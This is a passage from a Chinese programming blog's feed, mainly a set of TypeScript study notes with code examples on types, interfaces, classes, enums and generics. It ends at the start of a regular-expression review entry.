    <summary type="html">&lt;h1 id=&quot;1-模板语法&quot;&gt;&lt;a href=&quot;#1-模板语法&quot; class=&quot;headerlink&quot; title=&quot;1.  模板语法&quot;&gt;&lt;/a&gt;1.  模板语法&lt;/h1&gt;&lt;h2 id=&quot;1-1-常见指令&quot;&gt;&lt;a href=&quot;#1-1-常见指令&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="Program" scheme="http://blog.le31ei.top/categories/Program/"/>
    
    
    <category term="vue" scheme="http://blog.le31ei.top/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>typescript学习记录</title>
    <link href="http://blog.le31ei.top/2021/01/18/typescript%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://blog.le31ei.top/2021/01/18/typescript%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2021-01-18T02:25:38.000Z</published>
    <updated>2021-01-18T13:08:43.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h1><p>全局安装：<code>npm install -g </code></p><h1 id="2-helloworld"><a href="#2-helloworld" class="headerlink" title="2 helloworld"></a>2 helloworld</h1><p>创建文件<code>test.ts</code></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hello = <span class="function">(<span class="params">name: <span class="built_in">string</span></span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`hello <span class="subst">$&#123;name&#125;</span>`</span></span><br><span class="line">&#125;</span><br><span class="line">hello(<span class="string">&quot;testme&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行命令行<code>tsc test.ts</code></p><p>生成<code>test.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hello = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello &quot;</span> + name;</span><br><span class="line">&#125;;</span><br><span class="line">hello(<span class="string">&quot;testme&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>string类型的限定并不会在js中产生新的代码，但是在tsc进行编译的时候，会有类型检查</p><p>将调用函数改为<code>hello(123)</code></p><p>会报如下错误：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">test.ts:<span class="number">7</span>:<span class="number">7</span> - error TS2345: Argument <span class="keyword">of</span> <span class="keyword">type</span> <span class="string">&#x27;number&#x27;</span> is not assignable to parameter <span class="keyword">of</span> <span class="keyword">type</span> <span class="string">&#x27;string&#x27;</span>.</span><br><span class="line"></span><br><span class="line"><span class="number">7</span> hello(<span class="number">123</span>)</span><br><span class="line">        ~~~</span><br><span class="line"></span><br><span class="line">Found <span class="number">1</span> error.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是<code>test.js</code>文件仍然生成了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hello = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello &quot;</span> + name;</span><br><span class="line">&#125;;</span><br><span class="line">hello(<span class="number">123</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3 数据类型"></a>3 数据类型</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> isDone: <span class="built_in">boolean</span> = <span class="literal">false</span>;</span><br><span class="line">isDone = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> age: <span class="built_in">number</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">let</span> firstname: <span class="built_in">string</span> = <span class="string">&#x27;testme&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> message: <span class="built_in">string</span> = <span class="string">`hello, <span class="subst">$&#123;firstname&#125;</span>`</span>;</span><br><span class="line"><span class="keyword">let</span> u: <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> n: <span class="literal">null</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> num: <span class="built_in">number</span> = <span class="literal">undefined</span>;</span><br></pre></td></tr></table></figure><p><strong>null和undefined的区别</strong></p><ol><li>变量在还未初始化时，变量的默认值为undefined</li><li>null表示尚未存在的对象，常用来表示函数返回一个不存在的对象。</li><li>undefined是在null的基础上派生出来的，所以会判定为相等</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.assert(<span class="literal">null</span> == <span class="literal">undefined</span>)   <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.assert(<span class="literal">null</span> === <span class="literal">undefined</span>)   <span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.assert(<span class="keyword">typeof</span> <span class="literal">null</span> == <span class="keyword">typeof</span> <span class="literal">undefined</span>)  <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p><strong>any类型</strong></p><p>可以赋值为任意类型，可以调用任意方法及属性</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> notSure: <span class="built_in">any</span> = <span class="number">4</span>;</span><br><span class="line">notSure = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">notSure = <span class="literal">true</span>;</span><br><span class="line">notSure.myName;</span><br><span class="line">notSure.getName();</span><br></pre></td></tr></table></figure><p><strong>const、let、var的区别</strong></p><ol><li>const定义的变量不可以修改，而且必须进行初始化</li><li>var定义的变量可以进行修改，不初始化会默认定义为undefined，不会报错</li><li>let是块作用域，在函数内部使用let定义变量后，对函数外部无影响。</li></ol><p>建议使用的优先级<code>const  &gt; let  &gt;  var </code></p><h1 id="4-数组和元组"><a href="#4-数组和元组" class="headerlink" title="4 数组和元组"></a>4 数组和元组</h1><p>数组，存放的数据为同一类型</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arrofNumbers: <span class="built_in">number</span>[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arrofNumbers.length;</span><br><span class="line">arrofNumbers.push(<span class="number">3</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arrofNumbers.length);</span><br></pre></td></tr></table></figure><p>元组，存放的数据可以为不同类型</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user: [<span class="built_in">string</span>, <span class="built_in">number</span>,] = [<span class="string">&#x27;1234&#x27;</span>, <span class="number">123</span>]</span><br><span class="line">user.push(<span class="string">&#x27;123&#x27;</span>)   <span class="comment">// push的值只能是定义时候的两种类型</span></span><br></pre></td></tr></table></figure><h1 id="5-interface接口"><a href="#5-interface接口" class="headerlink" title="5 interface接口"></a>5 interface接口</h1><p>定义：对对象的形状进行描述</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> IPerson&#123;</span><br><span class="line">    <span class="keyword">readonly</span> id: <span class="built_in">number</span>;   <span class="comment">// 不可以变</span></span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">    age?: <span class="built_in">number</span>;  <span class="comment">// age属性为可选可不选</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> viking: IPerson = &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    name: <span class="string">&#x27;viking&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">viking.id = <span class="number">123</span>;  <span class="comment">// 报错，为只读</span></span><br></pre></td></tr></table></figure><h1 id="6-函数"><a href="#6-函数" class="headerlink" title="6 函数"></a>6 函数</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add2 = (x: <span class="built_in">number</span>, <span class="attr">y</span>: <span class="built_in">number</span>, z?:<span class="built_in">number</span>): <span class="function"><span class="params">number</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> z === <span class="string">&#x27;number&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> x+y+z;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> ISum&#123;</span><br><span class="line">    (x: <span class="built_in">number</span>, <span class="attr">y</span>: <span class="built_in">number</span>, z?:<span class="built_in">number</span>): <span class="built_in">number</span>   <span class="comment">//接口定义函数类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> add3: ISum = add</span><br></pre></td></tr></table></figure><h1 id="7-类型推论、联合类型、类型断言"><a href="#7-类型推论、联合类型、类型断言" class="headerlink" title="7 类型推论、联合类型、类型断言"></a>7 类型推论、联合类型、类型断言</h1><p>根据赋值的类型推断出变量的类型：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;sstr&#x27;</span>;</span><br></pre></td></tr></table></figure><p>联合类型</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> numberOrString: <span class="built_in">number</span> | <span class="built_in">string</span>;</span><br><span class="line">numberOrString.length</span><br><span class="line">numberOrString.toString  <span class="comment">// 只能访问联合类型中共有的属性或者方法</span></span><br><span class="line">numberOrString = <span class="number">123</span>;</span><br><span class="line">numberOrString = <span class="string">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure><p>类型断言：在函数中断言该变量类型是什么类型，然后调用对应的方法</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLength</span>(<span class="params">input: <span class="built_in">string</span> | <span class="built_in">number</span></span>): <span class="title">number</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> str = input <span class="keyword">as</span> <span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">if</span> (str.length)&#123;</span><br><span class="line">        <span class="keyword">return</span> str.length</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> num = input <span class="keyword">as</span> <span class="built_in">number</span></span><br><span class="line">        <span class="keyword">return</span> num.toString().length</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一种写法：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLength2</span>(<span class="params">input: <span class="built_in">string</span> | <span class="built_in">number</span></span>): <span class="title">number</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> input === <span class="string">&#x27;string&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> input.length</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> input.toString().length</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="8-类"><a href="#8-类" class="headerlink" title="8 类"></a>8 类</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span> is running`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> snack = <span class="keyword">new</span> Animal(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">bark</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span> is barking`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> xiaobao = <span class="keyword">new</span> Dog(<span class="string">&#x27;xiaobao&#x27;</span>)</span><br></pre></td></tr></table></figure><p>类实现接口</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> IRadio &#123;</span><br><span class="line">    switchRadio(trigger: <span class="built_in">boolean</span>): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> IBattary&#123;</span><br><span class="line">    checkBattaryStatus(): <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> IRadioWithBattery <span class="keyword">extends</span> IRadio&#123;</span><br><span class="line">    checkBattaryStatus(): <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> <span class="title">implements</span> <span class="title">IRadio</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">switchRadio</span>(<span class="params">trigger: <span class="built_in">boolean</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CellPhone</span> <span class="title">implements</span> <span class="title">IRadioWithBattery</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">switchRadio</span>(<span class="params">trigger: <span class="built_in">boolean</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">checkBattaryStatus</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="9-枚举"><a href="#9-枚举" class="headerlink" title="9 枚举"></a>9 枚举</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">enum</span> Direction&#123;</span><br><span class="line">    Up = <span class="number">10</span>,</span><br><span class="line">    Down,</span><br><span class="line">    Left,</span><br><span class="line">    Rigth,</span><br><span class="line">&#125;  <span class="comment">//首项进行赋值后，后续项进行递增</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Left)</span><br><span class="line"><span class="built_in">console</span>.log(Direction[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="built_in">enum</span> Direction&#123;</span><br><span class="line">    Up = <span class="string">&quot;Up&quot;</span>,</span><br><span class="line">    Down = <span class="string">&quot;Down&quot;</span>,</span><br><span class="line">    Left = <span class="string">&quot;Left&quot;</span>,</span><br><span class="line">    Rigth = <span class="string">&quot;Right&quot;</span>,</span><br><span class="line">&#125; <span class="comment">//常量枚举</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="10-泛型"><a href="#10-泛型" class="headerlink" title="10 泛型"></a>10 泛型</h1><p>根据我们传入的一个类型，返回一个类型</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echo</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echo2</span>(<span class="params">arg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> str: <span class="built_in">string</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = echo(str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result2 = echo2(str);</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>&lt;<span class="title">T</span>, <span class="title">U</span>&gt;(<span class="params">tuple: [T, U]</span>): [<span class="title">U</span>, <span class="title">T</span>] </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [tuple[<span class="number">1</span>], tuple[<span class="number">0</span>]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> res = swap([<span class="string">&#x27;string&#x27;</span>, <span class="number">123</span>])</span><br></pre></td></tr></table></figure><p><strong>约束泛型</strong></p><p>提前在代码中使用对应类型的方法及属性。</p><p>通过接口定义来约束泛型</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> IWithLength&#123;</span><br><span class="line">    length: <span class="built_in">number</span>    <span class="comment">//鸭子模型，有该属性就行，名称无所谓</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoWithArr2</span>&lt;<span class="title">T</span> <span class="title">extends</span> <span class="title">IWithLength</span>&gt;(<span class="params">arg: T[]</span>): <span class="title">T</span>[]</span>&#123;   </span><br><span class="line">    <span class="built_in">console</span>.log(arg.length)</span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>泛型类</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> data = [];</span><br><span class="line">    <span class="function"><span class="title">push</span>(<span class="params">item:T</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.data.push(item)</span><br><span class="line">    &#125;</span><br><span class="line">    pop():T&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.data.shift()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> queue = <span class="keyword">new</span> Queue&lt;<span class="built_in">number</span>&gt;();</span><br><span class="line">queue.push(<span class="number">1</span>);</span><br><span class="line">queue.push(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(queue.pop().toFixed())</span><br><span class="line"><span class="built_in">console</span>.log(queue.pop().toFixed())</span><br></pre></td></tr></table></figure><p><strong>泛型接口</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> KeyPair&lt;T, U&gt;&#123;</span><br><span class="line">    key: T,</span><br><span class="line">    value: U</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> kp1: KeyPair&lt;<span class="built_in">number</span>, <span class="built_in">string</span>&gt; = &#123;<span class="attr">key</span>: <span class="number">1</span>, <span class="attr">value</span>: <span class="string">&#x27;str&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">let</span> kp2: KeyPair&lt;<span class="built_in">string</span>, <span class="built_in">number</span>&gt; = &#123;<span class="attr">key</span>: <span class="string">&#x27;1&#x27;</span>, <span class="attr">value</span>: <span class="number">123</span>&#125;</span><br><span class="line"><span class="keyword">let</span> arr2: <span class="built_in">Array</span>&lt;<span class="built_in">number</span>&gt; = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure><h1 id="11-交叉类型"><a href="#11-交叉类型" class="headerlink" title="11 交叉类型"></a>11 交叉类型</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> IName&#123;</span><br><span class="line">    name:<span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> IPerson = IName &amp; &#123; <span class="attr">age</span>: <span class="built_in">number</span>&#125; <span class="comment">// 使用&amp;将两个类型连接起来</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person: IPerson = &#123;<span class="attr">name</span>: <span class="string">&#x27;test&#x27;</span>, <span class="attr">age</span>: <span class="number">123</span>&#125;   </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-安装&quot;&gt;&lt;a href=&quot;#1-安装&quot; class=&quot;headerlink&quot; title=&quot;1 安装&quot;&gt;&lt;/a&gt;1 安装&lt;/h1&gt;&lt;p&gt;全局安装：&lt;code&gt;npm install -g &lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;2-helloworld&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="Program" scheme="http://blog.le31ei.top/categories/Program/"/>
    
    
    <category term="typescript" scheme="http://blog.le31ei.top/tags/typescript/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式复习</title>
    <link href="http://blog.le31ei.top/2020/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%A4%8D%E4%B9%A0/"/>
    <id>http://blog.le31ei.top/2020/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%A4%8D%E4%B9%A0/</id>
    <published>2020-11-24T06:54:40.000Z</published>
    <updated>2020-11-24T06:54:40.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-基本语法"><a href="#0x01-基本语法" class="headerlink" title="0x01 基本语法"></a>0x01 基本语法</h1><p><strong>修饰符（g i m）</strong></p><ul><li>g：global表示全局匹配</li><li>i：ignore case表示忽略大小写匹配</li><li>m：multiple line多行匹配</li></ul><p><strong>元字符</strong></p><ul><li><code>.</code>：匹配除换行符以外的任意字符</li><li><code>\w</code>：匹配字母、数字、下划线、汉字</li><li><code>\s</code>：匹配任意空白字符</li><li><code>\d</code>：匹配数字</li><li><code>\b</code>：匹配单词的开始或者结束</li><li><code>^</code>：匹配字符的开始</li><li><code>$</code>：匹配字符的结束</li></ul><p><strong>重复</strong></p><ul><li><code>*</code>：重复0次或者多次</li><li><code>+</code>：重复1次或者多次</li><li><code>?</code>：重复0次或者1次</li><li><code>&#123;n&#125;</code>：重复n次</li><li><code>&#123;n,&#125;</code>：重复n次到多次</li><li><code>&#123;n,m&#125;</code>：重复n到m次</li></ul><p><strong>字符类</strong></p><p><code>[]</code>：匹配中括号中的任意一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[abc]：匹配abc任意一个字符</span><br></pre></td></tr></table></figure><p><strong>反义</strong></p><p><code>[^]</code>：不包含中括号中的任意一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^abc]：不包含abc任意一个字符</span><br></pre></td></tr></table></figure><p><code>\W</code>：除\w意外的任意字符</p><p><code>\S</code>：匹配任意不是空白符的字符</p><p><code>\D</code>：匹配任意非数字的字符</p><p><code>\B</code>：匹配不是单词开头或结束的位置</p><p>范围类**</p><p><code>[a-z]、[A-Z]、[0-9]</code>：匹配范围内的任意一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a-zA-Z0-9]：匹配范围中的任意一个字符</span><br></pre></td></tr></table></figure><p><strong>贪婪与非贪婪</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 